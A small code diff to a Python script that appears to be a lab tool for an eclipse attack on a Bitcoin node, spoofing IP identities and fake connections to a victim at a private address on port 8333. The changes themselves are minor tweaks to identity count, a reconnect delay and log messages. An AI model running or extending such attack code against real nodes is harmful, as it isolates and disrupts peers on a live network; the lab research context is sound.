@@ -16,7 +16,7 @@ import struct
 eclipse_packet_drop_rate = 0
 
 
-num_identities = 3
+num_identities = 1
 
 victim_ip = '10.0.2.4'
 victim_port = 8333
@@ -96,7 +96,7 @@ def close_connection(index):
 	ip, port = spoof_IP_and_ports[index]
 	interface = spoof_IP_interface[index][0]
 	socket = spoof_IP_sockets[index]
-	
+
 	del spoof_IP_and_ports[index]
 	del spoof_IP_sockets[index]
 	del spoof_IP_interface[index]
@@ -224,6 +224,7 @@ def packet_received(packet):
 				except Exception as e:
 					print("Closing socket because of error: " + str(e))
 					close_connection(rand_i)
+					time.sleep(5)
 					make_fake_connection(rand_ip, victim_ip, False) # Use old IP
 					#make_fake_connection(random_ip(), victim_ip)
 					sys.exit() # Stop the current thread that sniffs for packets on this interface
@@ -267,8 +268,8 @@ def cleanup_ipaliases():
 
 # This function is ran when the script is stopped
 def on_close():
+	print('Closing open sockets')
 	for socket in spoof_IP_sockets:
-		print(f'CLOSING SOCKET {socket}')
 		socket.close()
 	cleanup_ipaliases()
 	cleanup_iptables()
